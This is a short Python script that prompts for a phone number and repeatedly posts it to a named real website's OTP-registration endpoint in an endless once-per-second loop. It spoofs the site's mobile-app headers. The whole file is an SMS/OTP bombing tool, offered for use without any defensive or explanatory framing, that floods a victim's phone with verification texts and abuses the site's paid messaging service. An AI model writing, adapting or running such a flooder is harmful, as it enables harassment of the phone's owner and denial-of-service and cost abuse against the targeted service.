import requests
import time

url = "https://www.mataaa.com/wp-json/api/flutter_user/register_otp"
headers = {
    "accept-encoding": "gzip",
    "content-length": "24",
    "content-type": "application/json; charset=utf-8",
    "host": "www.mataaa.com",
    "user-agent": "Dart/2.19 (dart:io)"
}

phone_number = input("Enter the phone number (e.g., 2189xxxxxxxx): ")

if not phone_number.isdigit() or len(phone_number) < 10:
    print("Invalid phone number. Try again.")
else:
    payload = {"phone": phone_number}

    while True:
        try:
            response = requests.post(url, headers=headers, json=payload)
            print(f"Status Code: {response.status_code}, Response: {response.text}")
            time.sleep(1)
        except Exception as e:
            print(f"Error: {e}")
            break
